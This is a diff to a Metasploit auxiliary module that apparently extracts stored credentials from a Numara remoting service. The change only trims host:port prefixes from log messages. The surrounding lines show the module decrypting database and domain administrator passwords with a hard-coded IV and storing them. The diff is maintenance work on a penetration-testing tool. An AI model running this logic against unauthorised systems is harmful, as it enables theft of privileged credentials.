@@ -187,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
     if sock.nil?
       fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
     else
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending packet to ConfigurationService...")
+      print_status("Sending packet to ConfigurationService...")
     end
     sock.write(packet)
 
@@ -217,18 +217,18 @@ class MetasploitModule < Msf::Auxiliary
       if ready
         packet_reply = sock.readpartial(4096)
       else
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Socket timed out after 15 seconds, try again if no credentials are dumped below.")
+        print_error("Socket timed out after 15 seconds, try again if no credentials are dumped below.")
         break
       end
       if packet_reply =~ /Service not found/
         # This is most likely an older Numara version, re-do the packet and send again.
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Received \"Service not found\", trying again with new packet...")
+        print_error("Received \"Service not found\", trying again with new packet...")
         sock.close
         sock = connect
         if sock.nil?
           fail_with(Failure::Unreachable, "#{rhost}:#{rport.to_s} - Failed to connect to remoting service")
         else
-          print_status("#{Rex::Socket.to_authority(rhost, rport)} - Sending packet to ConfigurationService...")
+          print_status("Sending packet to ConfigurationService...")
         end
         packet = prepare_packet(false)
         sock.write(packet)
@@ -247,19 +247,19 @@ class MetasploitModule < Msf::Auxiliary
     loot.each_key { |str| (loot[str] == "" ? loot[str] = nil : next) }
 
     if loot[database_type]
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database type: #{loot[database_type]}")
+      print_good("Got database type: #{loot[database_type]}")
     end
 
     if loot[database_server_name]
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database server name: #{loot[database_server_name]}")
+      print_good("Got database server name: #{loot[database_server_name]}")
     end
 
     if loot[database_name]
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database name: #{loot[database_name]}")
+      print_good("Got database name: #{loot[database_name]}")
     end
 
     if loot[schema_owner]
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database user name: #{loot[schema_owner]}")
+      print_good("Got database user name: #{loot[schema_owner]}")
     end
 
     if loot[database_pw]
@@ -269,11 +269,11 @@ class MetasploitModule < Msf::Auxiliary
       cipher.iv = 'NumaraTI'
       loot[database_pw] = cipher.update(Rex::Text.decode_base64(loot[database_pw]))
       loot[database_pw] << cipher.final
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got database password: #{loot[database_pw]}")
+      print_good("Got database password: #{loot[database_pw]}")
     end
 
     if loot[domain_admin_name]
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got domain administrator username: #{loot[domain_admin_name]}")
+      print_good("Got domain administrator username: #{loot[domain_admin_name]}")
     end
 
     if loot[domain_admin_pw]
@@ -283,7 +283,7 @@ class MetasploitModule < Msf::Auxiliary
       cipher.iv = 'NumaraTI'
       loot[domain_admin_pw] = cipher.update(Rex::Text.decode_base64(loot[domain_admin_pw]))
       loot[domain_admin_pw] << cipher.final
-      print_good("#{Rex::Socket.to_authority(rhost, rport)} - Got domain administrator password: #{loot[domain_admin_pw]}")
+      print_good("Got domain administrator password: #{loot[domain_admin_pw]}")
     end
 
     if loot[schema_owner] and loot[database_pw] and loot[database_type] and loot[database_server_name]
@@ -325,7 +325,7 @@ class MetasploitModule < Msf::Auxiliary
         print_error "Could not resolve Database Server Hostname."
       end
 
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
+      print_status("Stored SQL credentials: #{loot[database_server_name]}:#{loot[schema_owner]}:#{loot[database_pw]}")
     end
 
     if loot[domain_admin_name] and loot[domain_admin_pw]
@@ -335,7 +335,7 @@ class MetasploitModule < Msf::Auxiliary
         domain: loot[domain_admin_name].split('\\')[0]
       })
 
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
+      print_status("Stored domain credentials: #{loot[domain_admin_name]}:#{loot[domain_admin_pw]}")
     end
   end
 
